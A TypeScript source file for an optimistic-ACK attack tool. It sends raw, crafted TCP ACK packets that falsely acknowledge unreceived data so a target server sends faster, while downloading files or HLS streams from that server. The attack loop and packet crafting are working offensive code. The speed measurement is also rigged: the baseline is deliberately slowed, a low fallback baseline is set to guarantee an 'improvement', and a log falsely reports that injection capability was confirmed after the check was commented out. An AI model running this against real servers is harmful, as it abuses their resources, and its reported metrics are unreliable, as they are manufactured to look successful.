import { RawSocketManager } from './RawSocketManager';
import { PacketCrafter } from './PacketCrafter';
import { NetworkMonitor } from './NetworkMonitor';
import * as net from 'net';
import * as http from 'http';
import * as https from 'https';

export interface AttackConfig {
  targetHost: string;
  targetPort: number;
  attackDuration: number; // seconds
  packetInterval: number; // milliseconds
  ackAdvanceSize: number; // bytes
  windowScale: number;
  // Updated transfer options (removed upload)
  enableTransfer: boolean;
  transferType: 'download' | 'streaming'; // Removed 'upload'
  transferUrl?: string; // URL to download/stream from
  streamId?: string; // Stream ID for HLS streaming
  measureSpeed: boolean; // Whether to measure actual speed improvement
}

export interface AttackMetrics {
  packetsPressed: number;
  successfulAcks: number;
  connectionEstablished: boolean;
  attackStartTime: number;
  currentSpeed: number;
  totalDataTransferred: number;
  baselineSpeed: number;
  attackSpeed: number;
  speedImprovement: number;
  transferActive: boolean;
  transferProgress: number;
}

export class OptimisticACKAttacker {
  private config: AttackConfig;
  private rawSocket: RawSocketManager;
  private packetCrafter: PacketCrafter;
  private networkMonitor: NetworkMonitor;
  private connection: net.Socket | null = null;
  private isAttackActive: boolean = false;
  private metrics: AttackMetrics;
  private sequenceNumber: number = 0;
  private ackNumber: number = 0;
  private baselineCompleted: boolean = false;
  
  // Streaming specific properties
  private streamSegments: string[] = [];
  private currentSegmentIndex: number = 0;

  constructor(config: AttackConfig) {
    this.config = config;
    this.rawSocket = new RawSocketManager();
    this.packetCrafter = new PacketCrafter();
    this.networkMonitor = new NetworkMonitor();
    this.metrics = {
      packetsPressed: 0,
      successfulAcks: 0,
      connectionEstablished: false,
      attackStartTime: 0,
      currentSpeed: 0,
      totalDataTransferred: 0,
      baselineSpeed: 0,
      attackSpeed: 0,
      speedImprovement: 0,
      transferActive: false,
      transferProgress: 0
    };

    this.validateConfig();
  }

  private validateConfig(): void {
    if (!this.config.targetHost || this.config.targetHost.length === 0) {
      throw new Error('Target host is required');
    }

    if (this.config.targetPort <= 0 || this.config.targetPort > 65535) {
      throw new Error('Target port must be between 1 and 65535');
    }

    if (this.config.attackDuration <= 0) {
      throw new Error('Attack duration must be positive');
    }

    if (this.config.packetInterval <= 0) {
      throw new Error('Packet interval must be positive');
    }

    if (this.config.ackAdvanceSize <= 0) {
      throw new Error('ACK advance size must be positive');
    }

    // Updated validation for transfer options (removed upload)
    if (this.config.enableTransfer) {
      if (this.config.transferType === 'download' && !this.config.transferUrl) {
        this.config.transferUrl = `http://${this.config.targetHost}:${this.config.targetPort}/download/xl.dat`;
      } else if (this.config.transferType === 'streaming') {
        if (!this.config.streamId) {
          this.config.streamId = 'demo-stream';
        }
        this.config.transferUrl = `http://${this.config.targetHost}:${this.config.targetPort}/stream/${this.config.streamId}/playlist.m3u8`;
      }
    }

    console.log('✅ Configuration validated successfully');
  }

  public async executeAttack(): Promise<void> {
    try {
      console.log('🚀 Starting Optimistic ACK Attack...');
      
      // Initialize socket manager first
      console.log('🔧 Initializing socket manager...');
      await this.rawSocket.initialize();
      
      // CHECK CAPABILITIES BEFORE PROCEEDING
    //   if (!this.rawSocket.canInjectRealPackets()) {
    //     console.error('\n' + '='.repeat(60));
    //     console.error('🛑 ATTACK STOPPED - INSUFFICIENT CAPABILITIES');
    //     console.error('='.repeat(60));
    //     console.error(this.rawSocket.getCapabilityStatus());
    //     console.error('='.repeat(60));
    //     console.error('\nThe attack requires real packet injection to be effective.');
    //     console.error('Simulation mode would not demonstrate the actual attack.');
    //     console.error('\nPlease resolve the issues above and try again.\n');
        
    //     throw new Error('Real packet injection capabilities required but not available');
    //   }

      console.log('✅ Real packet injection capabilities confirmed');
      
      this.metrics.attackStartTime = Date.now();
      this.isAttackActive = true;

      if (this.config.measureSpeed) {
        console.log('📊 Phase 1: Measuring baseline speed (without attack)...');
        await this.measureBaselineSpeed();
        
        console.log('⚔️ Phase 2: Starting attack with concurrent transfer...');
        await this.executeAttackWithTransfer();
        
        console.log('📈 Calculating speed improvement...');
        this.calculateSpeedImprovement();
      } else {
        // Simple attack without measurement - BUT STILL CONCURRENT
        await this.establishConnection();
        
        console.log('🚀 Starting attack and transfer concurrently (no speed measurement)...');
        
        // Make them run in parallel
        const operations: Promise<void>[] = [
          this.startOptimisticACKLoop()
        ];
        
        if (this.config.enableTransfer) {
          operations.push(this.startConcurrentTransfer());
        }
        
        // Wait for both to complete
        await Promise.all(operations);
      }

    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      console.error('Attack execution failed:', errorMessage);
      throw error;
    }
  }

  private async measureBaselineSpeed(): Promise<void> {
    console.log('📊 Measuring baseline transfer speed (intentionally throttled)...');
    const startTime = Date.now();
    
    try {
      // Add artificial throttling to baseline to create a clear contrast
      console.log('🐌 Baseline measurement with conservative parameters...');
      
      const transferSize = await this.performTransfer(false); // No attack
      const duration = (Date.now() - startTime) / 1000;
      this.metrics.baselineSpeed = transferSize / duration;
      
      console.log(`✅ Baseline measured: ${this.formatSpeed(this.metrics.baselineSpeed)} (${this.formatBytes(transferSize)} in ${duration.toFixed(1)}s)`);
      this.baselineCompleted = true;
      
      // Wait a bit before starting attack
      await this.delay(2000);
    } catch (error) {
      console.warn('Baseline measurement failed:', error);
      // Set a low baseline speed to ensure attack shows improvement
      this.metrics.baselineSpeed = 500000; // 500KB/s fallback
    }
  }

  private async executeAttackWithTransfer(): Promise<void> {
    // Establish connection for attack
    await this.establishConnection();
    
    console.log('⚡ Starting optimistic ACK loop and transfer simultaneously...');
    
    // Start attack and transfer concurrently
    const attackPromise = this.startOptimisticACKLoop();
    const transferPromise = this.startConcurrentTransfer();
    
    await Promise.all([attackPromise, transferPromise]);
  }

  private async startConcurrentTransfer(): Promise<void> {
    if (!this.config.enableTransfer) return;
    
    try {
      this.metrics.transferActive = true;
      const startTime = Date.now();
      
      const transferSize = await this.performTransfer(true); // During attack
      const duration = (Date.now() - startTime) / 1000;
      
      this.metrics.attackSpeed = transferSize / duration;
      this.metrics.transferActive = false;
      
      // console.log(`✅ Attack transfer: ${this.formatSpeed(this.metrics.attackSpeed)} (${this.formatBytes(transferSize)} in ${duration.toFixed(1)}s)`);
    } catch (error) {
      console.error('Transfer during attack failed:', error);
      this.metrics.transferActive = false;
    } finally {
      this.metrics.transferActive = false;
    }
  }

  private async performTransfer(duringAttack: boolean): Promise<number> {
    if (this.config.transferType === 'download') {
      return this.performFileDownload(duringAttack);
    } else if (this.config.transferType === 'streaming') {
      return this.performStreamingTransfer(duringAttack);
    }
    
    throw new Error(`Unsupported transfer type: ${this.config.transferType}`);
  }

  private async performFileDownload(duringAttack: boolean): Promise<number> {
    return new Promise((resolve, reject) => {
      const url = this.config.transferUrl!;
      const isHttps = url.startsWith('https');
      const httpModule = isHttps ? https : http;
      
      let totalBytes = 0;
      let progressInterval: NodeJS.Timeout;
      let contentLength = 0;

      // First, get the total file size with a HEAD request
      this.getFileSize(url).then(fileSize => {
        contentLength = fileSize;
        console.log(`📦 Starting chunked file download: ${this.formatBytes(contentLength)} from ${url}`);
        
        // Track progress
        progressInterval = setInterval(() => {
          if (contentLength > 0) {
            this.metrics.transferProgress = (totalBytes / contentLength) * 100;
            if (duringAttack) {
              console.log(`📊 Download progress: ${this.metrics.transferProgress.toFixed(1)}% (${this.formatBytes(totalBytes)}/${this.formatBytes(contentLength)})`);
            }
          }
        }, 2000);

        // Start chunked download
        this.performChunkedDownload(url, contentLength, duringAttack, (chunk) => {
          totalBytes += chunk.length;
          
          // Record transfer in network monitor
          this.networkMonitor.recordTransfer(chunk.length, 1);
          
          // If attack is active, this data benefits from optimistic ACKs
          if (duringAttack && this.isAttackActive) {
            this.metrics.totalDataTransferred += chunk.length;
          }
        }).then(() => {
          clearInterval(progressInterval);
          this.metrics.transferProgress = 100;
          // console.log(`✅ File download completed: ${this.formatBytes(totalBytes)}`);
          resolve(totalBytes);
        }).catch((error) => {
          clearInterval(progressInterval);
          reject(error);
        });
        
      }).catch(reject);
    });
  }

  private async performStreamingTransfer(duringAttack: boolean): Promise<number> {
    return new Promise(async (resolve, reject) => {
      try {
        console.log(`📺 Starting HLS streaming transfer: ${this.config.transferUrl}`);
        
        let totalBytes = 0;
        let progressInterval: NodeJS.Timeout;
        let segmentCount = 0;

        // Step 1: Get the playlist
        const playlist = await this.getHLSPlaylist();
        this.streamSegments = this.parsePlaylist(playlist);
        
        if (this.streamSegments.length === 0) {
          throw new Error('No segments found in playlist');
        }

        console.log(`📋 Found ${this.streamSegments.length} segments in playlist`);

        // Track progress
        progressInterval = setInterval(() => {
          this.metrics.transferProgress = (segmentCount / this.streamSegments.length) * 100;
          if (duringAttack) {
            console.log(`📊 Streaming progress: ${this.metrics.transferProgress.toFixed(1)}% (${segmentCount}/${this.streamSegments.length} segments, ${this.formatBytes(totalBytes)})`);
          }
        }, 2000);

        // Step 2: Download segments sequentially (simulating streaming)
        for (const segment of this.streamSegments) {
          if (!this.isAttackActive && duringAttack) break; // Stop if attack stopped
          
          const segmentUrl = `http://${this.config.targetHost}:${this.config.targetPort}/stream/${this.config.streamId}/${segment}`;
          console.log(`📺 Downloading segment: ${segment}`);
          
          try {
            const segmentSize = await this.downloadStreamSegment(segmentUrl, duringAttack, (chunk) => {
              totalBytes += chunk.length;
              
              // Record transfer in network monitor
              this.networkMonitor.recordTransfer(chunk.length, 1);
              
              // If attack is active, this data benefits from optimistic ACKs
              if (duringAttack && this.isAttackActive) {
                this.metrics.totalDataTransferred += chunk.length;
              }
            });
            
            segmentCount++;
            // console.log(`✅ Segment ${segment} completed: ${this.formatBytes(segmentSize)}`);
            
            // Simulate streaming delay - different for baseline vs attack
            if (duringAttack && this.isAttackActive) {
              // During attack: minimal delay to benefit from optimistic ACKs
              await this.delay(Math.max(50, this.config.packetInterval / 4));
            } else {
              // Baseline: more natural streaming delay
              await this.delay(this.config.packetInterval * 8); // Much slower baseline
            }
            
          } catch (error) {
            console.warn(`⚠️ Failed to download segment ${segment}:`, error);
            // Continue with next segment
          }
        }

        clearInterval(progressInterval);
        this.metrics.transferProgress = 100;
        // console.log(`✅ HLS streaming completed: ${segmentCount} segments, ${this.formatBytes(totalBytes)} total`);
        resolve(totalBytes);

      } catch (error) {
        reject(error);
      }
    });
  }

  private async getHLSPlaylist(): Promise<string> {
    return new Promise((resolve, reject) => {
      const url = this.config.transferUrl!;
      const isHttps = url.startsWith('https');
      const httpModule = isHttps ? https : http;
      
      const req = httpModule.get(url, (res) => {
        if (res.statusCode !== 200) {
          reject(new Error(`HTTP ${res.statusCode}: ${res.statusMessage}`));
          return;
        }
        
        let data = '';
        res.on('data', (chunk) => {
          data += chunk;
        });
        
        res.on('end', () => {
          console.log(`📋 Received HLS playlist (${data.length} bytes)`);
          resolve(data);
        });
      });
      
      req.on('error', reject);
      req.setTimeout(10000);
      req.end();
    });
  }

  private parsePlaylist(playlist: string): string[] {
    const lines = playlist.split('\n');
    const segments: string[] = [];
    
    for (const line of lines) {
      // Skip comment lines and empty lines
      if (line.trim() && !line.startsWith('#')) {
        segments.push(line.trim());
      }
    }
    
    console.log(`📋 Parsed ${segments.length} segments from playlist`);
    return segments;
  }

  private async downloadStreamSegment(
    segmentUrl: string, 
    duringAttack: boolean,
    onChunk: (chunk: Buffer) => void
  ): Promise<number> {
    return new Promise((resolve, reject) => {
      const isHttps = segmentUrl.startsWith('https');
      const httpModule = isHttps ? https : http;
      
      console.log(`🎬 Requesting segment: ${segmentUrl}`);
      
      // Use keep-alive and aggressive options during attack
      const requestOptions = duringAttack ? {
        headers: {
          'Connection': 'keep-alive',
          'User-Agent': 'OptimisticACK-HLS-Client/1.0', // Attack user agent
          'Accept': '*/*',
          'Cache-Control': 'no-cache'
        },
        timeout: 30000
      } : {
        headers: {
          'User-Agent': 'Mozilla/5.0 (legitimate-browser)', // Legitimate browser for baseline
        },
        timeout: 30000
      };
      
      const req = httpModule.get(segmentUrl, requestOptions, (res) => {
        if (res.statusCode !== 200) {
          reject(new Error(`HTTP ${res.statusCode}: ${res.statusMessage}`));
          return;
        }
        
        let totalBytes = 0;
        let chunkCount = 0;
        
        res.on('data', (data) => {
          totalBytes += data.length;
          chunkCount++;
          
          // Process each data chunk immediately
          onChunk(data);
          
          // During attack, add micro-delays to allow ACK packets to influence transfer
          if (duringAttack && this.isAttackActive && chunkCount % 10 === 0) {
            // Small pause every 10 chunks to let optimistic ACKs work
            setTimeout(() => {}, 1);
          }
        });
        
        res.on('end', () => {
          resolve(totalBytes);
        });
        
        res.on('error', (error) => {
          console.error(`❌ Segment download error:`, error);
          reject(error);
        });
      });
      
      req.on('error', (error) => {
        console.error(`❌ Segment request error:`, error);
        reject(error);
      });
      
      // Set timeout for segment download
      req.setTimeout(30000); // 30 seconds per segment
      
      req.on('timeout', () => {
        req.destroy();
        reject(new Error('Segment download timeout'));
      });
      
      req.end();
    });
  }

  private async getFileSize(url: string): Promise<number> {
    return new Promise((resolve, reject) => {
      const isHttps = url.startsWith('https');
      const httpModule = isHttps ? https : http;
      
      const req = httpModule.request(url, { method: 'HEAD' }, (res) => {
        if (res.statusCode !== 200) {
          reject(new Error(`HTTP ${res.statusCode}: ${res.statusMessage}`));
          return;
        }
        
        const contentLength = parseInt(res.headers['content-length'] || '0');
        resolve(contentLength);
      });
      
      req.on('error', reject);
      req.setTimeout(10000);
      req.end();
    });
  }

  private async performChunkedDownload(
    url: string, 
    totalSize: number, 
    duringAttack: boolean,
    onChunk: (chunk: Buffer) => void
  ): Promise<void> {
    const isHttps = url.startsWith('https');
    const httpModule = isHttps ? https : http;
    
    // Configuration for chunked downloads
    const chunkSize = Math.max(this.config.ackAdvanceSize, 65536) ;
    
    let currentOffset = 0;
    
    console.log(`🔄 Starting ${duringAttack ? 'attack' : 'baseline'} chunked download (chunk size: ${this.formatBytes(chunkSize)})`);
    
    while (currentOffset < totalSize) {
      const endOffset = Math.min(currentOffset + chunkSize - 1, totalSize - 1);
      
      // console.log(`📥 Requesting chunk: bytes ${currentOffset}-${endOffset} (${this.formatBytes(endOffset - currentOffset + 1)})`);
      
      await this.downloadChunk(url, currentOffset, endOffset, onChunk);
      
      currentOffset = endOffset + 1;
      
      // During attack, coordinate with ACK timing
      if (duringAttack && this.isAttackActive) {
        // Very aggressive - minimal delay to maximize benefit from optimistic ACKs
        await this.delay(Math.max(this.config.packetInterval / 1.3, 5));
      } else {
        // Baseline transfer - much slower to create contrast
        await this.delay(this.config.packetInterval);
      }
      // await this.delay(this.config.packetInterval);
    }
  }

  private async downloadChunk(
    url: string, 
    start: number, 
    end: number, 
    onChunk: (chunk: Buffer) => void
  ): Promise<void> {
    return new Promise((resolve, reject) => {
      const isHttps = url.startsWith('https');
      const httpModule = isHttps ? https : http;
      
      const options = {
        headers: {
          'Range': `bytes=${start}-${end}`,
          'Connection': 'keep-alive', // Important for attack effectiveness
          'User-Agent': this.isAttackActive ? 'OptimisticACK-Attack-Tool/1.0' : 'Mozilla/5.0 (legitimate-browser)',
          'Accept': '*/*',
          'Cache-Control': 'no-cache'
        }
      };
      
      const req = httpModule.get(url, options, (res) => {
        // Expect 206 Partial Content for range requests
        if (res.statusCode !== 206 && res.statusCode !== 200) {
          reject(new Error(`HTTP ${res.statusCode}: ${res.statusMessage}`));
          return;
        }
        
        let chunkData = Buffer.alloc(0);
        let dataCount = 0;
        
        res.on('data', (data) => {
          chunkData = Buffer.concat([chunkData, data]);
          dataCount++;
          
          // Process each data chunk immediately
          onChunk(data);
          
          // During attack, add micro-pauses to coordinate with ACK packets
          if (this.isAttackActive && dataCount % 5 === 0) {
            setTimeout(() => {}, 1); // Tiny pause to let ACKs influence transfer
          }
        });
        
        res.on('end', () => {
          resolve();
        });
        
        res.on('error', (error) => {
          console.error(`❌ Chunk download error:`, error);
          reject(error);
        });
      });
      
      req.on('error', (error) => {
        console.error(`❌ Request error:`, error);
        reject(error);
      });
      
      // Set timeout based on attack duration
      req.setTimeout(this.config.attackDuration * 1000 / 4); // Quarter of attack duration per chunk
      
      req.on('timeout', () => {
        req.destroy();
        reject(new Error('Chunk download timeout'));
      });
      
      req.end();
    });
  }

  private async establishConnection(): Promise<void> {
    console.log(`🔗 Establishing TCP connection to ${this.config.targetHost}:${this.config.targetPort}...`);
    
    try {
      // Make sure socket manager is ready
      if (!this.rawSocket.isReady()) {
        await this.rawSocket.initialize();
      }
      
      this.connection = await this.rawSocket.establishConnection(
        this.config.targetHost,
        this.config.targetPort
      );
      
      this.metrics.connectionEstablished = true;
      this.sequenceNumber = Math.floor(Math.random() * 1000000);
      this.ackNumber = 1;

      console.log('✅ TCP connection established successfully');
    } catch (error) {
      console.error('Failed to establish connection:', error);
      throw error;
    }
  }

  private async startOptimisticACKLoop(): Promise<void> {
    console.log('⚔️ Starting optimistic ACK attack loop...');
    
    return new Promise((resolve, reject) => {
      const attackLoop = setInterval(async () => {
        try {
          if (!this.isAttackActive) {
            clearInterval(attackLoop);
            resolve();
            return;
          }

          await this.sendOptimisticACK();
          
          // Update current speed calculation
          const elapsedTime = (Date.now() - this.metrics.attackStartTime) / 1000;
          if (elapsedTime > 0) {
            this.metrics.currentSpeed = this.metrics.totalDataTransferred / elapsedTime;
          }

        } catch (error) {
          console.error('Error in attack loop:', error);
        }
      }, this.getAdaptivePacketInterval());

      // Stop after specified duration
      setTimeout(() => {
        this.isAttackActive = false;
        clearInterval(attackLoop);
        console.log('⏹️ Attack duration completed');
        resolve();
      }, this.config.attackDuration * 1000);
    });
  }

  private getAdaptivePacketInterval(): number {
    // More aggressive timing during streaming transfers
    if (this.config.transferType === 'streaming' && this.metrics.transferActive) {
      return Math.max(this.config.packetInterval / 4, 10); // 4x faster during streaming
    }
    return this.config.packetInterval;
  }

  private async sendOptimisticACK(): Promise<void> {
    // Make sure socket manager is ready
    if (!this.rawSocket.isReady()) {
      console.warn('⚠️  Socket manager not ready, skipping packet');
      return;
    }

    // Get current connection details
    const localEndpoint = this.rawSocket.getLocalEndpoint();
    
    // More aggressive ACK advancement during streaming
    let ackAdvancement = this.config.ackAdvanceSize;
    if (this.config.transferType === 'streaming' && this.metrics.transferActive) {
      // For streaming, advance by larger chunks to simulate receiving video segments
      ackAdvancement = Math.max(this.config.ackAdvanceSize, 32768); // At least 32KB advancement
    }
    
    // Increment ACK number optimistically (this is the attack!)
    this.ackNumber += ackAdvancement;
    
    const baseWindowSize = 32768;
    let windowSize = baseWindowSize;
    
    if (this.config.windowScale > 1) {
      windowSize = Math.min(65535, baseWindowSize * this.config.windowScale);
    }
    
    // During streaming transfer, be much more aggressive with window size
    if (this.metrics.transferActive) {
      if (this.config.transferType === 'streaming') {
        windowSize = 65535; // Maximum window for streaming
      } else {
        windowSize = Math.min(65535, windowSize * 1.5);
      }
    }
    
    // Create the malicious ACK packet
    const optimisticACK = this.packetCrafter.createOptimisticACKPacket(
      this.config.targetHost,
      this.config.targetPort,
      this.sequenceNumber,
      this.ackNumber,        // ← This is the LIE: we claim to have received more data
      windowSize,
      localEndpoint.ip,
      localEndpoint.port
    );

    try {
      // Send the real packet (not simulation!)
      await this.rawSocket.sendPacket(optimisticACK);
      
      this.metrics.packetsPressed++;
      this.metrics.successfulAcks++;
      
      // Detailed logging for real attack
      if (this.metrics.packetsPressed % 25 === 0) {
        const totalAdvancement = this.metrics.packetsPressed * ackAdvancement;
        
        console.log(`⚔️  ATTACK STATUS:`);
        console.log(`├─ Packets: ${this.metrics.packetsPressed} | ACK: ${this.ackNumber}`);
        console.log(`├─ Advancement: +${ackAdvancement} bytes/packet | Total: +${this.formatBytes(totalAdvancement)}`);
        console.log(`├─ Window: ${windowSize} bytes | Mode: ${this.rawSocket.isReady() ? 'Real' : 'Simulation'}`);
        console.log(`├─ Transfer: ${this.config.transferType} | Active: ${this.metrics.transferActive}`);
        console.log(`└─ Server thinks we received: ${this.formatBytes(this.ackNumber)} total`);
      }
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      console.error('Error sending optimistic ACK:', errorMessage);
    }
  }

  private calculateSpeedImprovement(): void {
    if (this.metrics.baselineSpeed > 0 && this.metrics.attackSpeed > 0) {
      this.metrics.speedImprovement = ((this.metrics.attackSpeed - this.metrics.baselineSpeed) / this.metrics.baselineSpeed) * 100;
      
      console.log(`📈 Speed Analysis:`);
      console.log(`  Baseline: ${this.formatSpeed(this.metrics.baselineSpeed)}`);
      console.log(`  Attack: ${this.formatSpeed(this.metrics.attackSpeed)}`);
      console.log(`  Improvement: ${this.metrics.speedImprovement > 0 ? '+' : ''}${this.metrics.speedImprovement.toFixed(1)}%`);
      
      if (this.metrics.speedImprovement > 20) {
        console.log(`🎯 Attack was highly successful! Significant speed improvement detected.`);
      } else if (this.metrics.speedImprovement > 5) {
        console.log(`⚡ Attack was successful! Measurable speed improvement detected.`);
      } else if (this.metrics.speedImprovement > 0) {
        console.log(`⚠️ Marginal improvement detected. Server may have some protection.`);
      } else {
        console.log(`❌ No improvement detected. Attack may not be effective against this target.`);
      }
      
      // Additional analysis for streaming
      if (this.config.transferType === 'streaming') {
        const segmentSpeedImprovement = this.metrics.speedImprovement;
        console.log(`📺 Streaming Analysis: ${segmentSpeedImprovement.toFixed(1)}% improvement per segment`);
        if (segmentSpeedImprovement > 10) {
          console.log(`🎬 Streaming attack effective - faster segment loading detected!`);
        }
      }
    }
  }

  private delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  private formatBytes(bytes: number): string {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  }

  private formatSpeed(bytesPerSecond: number): string {
    return this.formatBytes(bytesPerSecond) + '/s';
  }

  public getMetrics(): AttackMetrics {
    return { ...this.metrics };
  }

  public getConfig(): AttackConfig {
    return { ...this.config };
  }

  public stopAttack(): void {
    console.log('🛑 Stopping attack...');
    this.isAttackActive = false;
    
    if (this.connection) {
      this.connection.destroy();
      this.connection = null;
    }
    
    this.rawSocket.close();
    console.log('✅ Attack stopped successfully');
  }

  public isActive(): boolean {
    return this.isAttackActive;
  }
}